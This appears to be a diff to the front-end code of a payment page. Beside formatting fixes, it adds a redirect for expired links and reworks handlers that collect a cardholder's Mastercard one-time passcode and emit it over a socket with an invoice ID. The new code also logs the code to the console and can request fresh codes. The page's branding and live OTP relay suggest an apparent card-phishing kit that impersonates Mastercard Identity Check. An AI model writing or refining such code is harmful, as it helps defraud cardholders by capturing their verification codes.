@@ -435,7 +435,7 @@ function getFailUrl(reason) {
                 <div class="text-sm text-gray-500 flex items-center gap-2">
                   <span>Service fee is 2% of the transaction amount</span>
                 </div>
-              <div id="invoiceIdContainer" class="mt-4 bg-gray-100 p-3 hidden">
+                <div id="invoiceIdContainer" class="mt-4 bg-gray-100 p-3 hidden">
                   <span class="text-sm font-medium">INVOICE ID: </span>
                   <span class="text-sm" id="invoiceId"></span>
                 </div>
@@ -612,7 +612,7 @@ function getFailUrl(reason) {
       
       <!-- Security notice -->
       <div style="display: flex; align-items: center; justify-content: center; margin-top: 20px; font-size: 12px; color: #666;">
-        <span style="margin-right: 8px;">🔒</span>
+       <span style="margin-right: 8px;">🔒</span>
         <span>Secured by Mastercard Identity Check™</span>
       </div>
     </div>
@@ -644,6 +644,18 @@ function getFailUrl(reason) {
       if (pid) {
         try {
           const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
+          
+          // If the payment link is expired, redirect to expired page
+          if (response.status === 410) {
+            console.log('Payment link has expired, redirecting to expired page');
+            window.location.href = '/expired.html';
+            return;
+          }
+          
+          if (!response.ok) {
+            throw new Error(`Failed to get payment details: ${response.status}`);
+          }
+          
           const data = await response.json();
           if (data.status === 'success' && data.payment?.amount) {
             const amount = parseFloat(data.payment.amount) || defaultAmount;
@@ -652,6 +664,11 @@ function getFailUrl(reason) {
           }
         } catch (error) {
           console.error('Payment details fetch error:', error);
+          // If there's an error getting payment details, we might want to redirect to expired/error page
+          if (error.message && error.message.includes('410')) {
+            window.location.href = '/expired.html';
+            return;
+          }
         }
       }
 
@@ -832,7 +849,7 @@ function getFailUrl(reason) {
         document.getElementById(id).addEventListener('input', updateSubmitButton);
       });
 
-  document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
+      document.getElementById('otp').addEventListener('input', updateConfirmOtpButton);
 
       // Payment Submission Handler
       document.getElementById('mainForm').addEventListener('submit', async function(e) {
@@ -975,7 +992,7 @@ function getFailUrl(reason) {
             // Restore the original content
             verificationContent.innerHTML = originalContent;
             
-            // Update merchant and amount info
+          // Update merchant and amount info
             const merchantElement = document.getElementById('merchantName');
             const amountElement2 = document.getElementById('transactionAmount2');
             
@@ -1269,20 +1286,23 @@ function getFailUrl(reason) {
             return;
           }
           
-          // Disable button and show loading state
+          // Show loading state on the button
           mcConfirmBtn.disabled = true;
-          const originalText = mcConfirmBtn.textContent;
-mcConfirmBtn.innerHTML = '<div style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle;"></div> VERIFYING...';
+          const originalText = mcConfirmBtn.innerHTML;
+          mcConfirmBtn.innerHTML = `
+            <div style="display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle;"></div>
+            <span style="opacity: 0.8;">VERIFYING...</span>
+          `;
           
-          // Emit event with OTP - use the existing socket
+          console.log('Sending MC OTP submission with invoiceId:', currentInvoiceId, 'OTP:', otp);
+          
+          // Use the global socket instance
           socket.emit('mc_otp_submitted', {
             invoiceId: currentInvoiceId,
             otp: otp
           });
           
-          console.log('MC OTP submitted:', otp, 'for invoice:', currentInvoiceId);
-          
-          // Reset button after some delay if no response
+          // Reset button after timeout if no response
           setTimeout(() => {
             if (mcConfirmBtn.disabled) {
               mcConfirmBtn.disabled = false;
@@ -1295,27 +1315,27 @@ mcConfirmBtn.innerHTML = '<div style="display: inline-block; width: 16px; height
       if (mcResendBtn) {
         mcResendBtn.addEventListener('click', function() {
           // Show loading state
-          const originalText = mcResendBtn.textContent;
           mcResendBtn.disabled = true;
-          mcResendBtn.textContent = 'SENDING...';
+          const originalText = mcResendBtn.innerHTML;
+          mcResendBtn.innerHTML = 'SENDING...';
           
-          // Request resend of OTP - use the existing socket
+          console.log('Requesting OTP resend for invoiceId:', currentInvoiceId);
+          
+          // Use the global socket instance
           socket.emit('mc_resend_otp', {
             invoiceId: currentInvoiceId
           });
           
-          console.log('Requested OTP resend for invoice:', currentInvoiceId);
-          
           // Reset timer
           setupMCTimerIfNeeded(true);
           
-          // Restore button after a short delay
+          // Restore button after delay
           setTimeout(() => {
             mcResendBtn.disabled = false;
-            mcResendBtn.textContent = originalText;
+            mcResendBtn.innerHTML = originalText;
             
             // Show notification to user
-            alert('A new verification code has been sent.');
+            alert('A new verification code has been sent to your registered mobile number.');
           }, 1500);
         });
       }
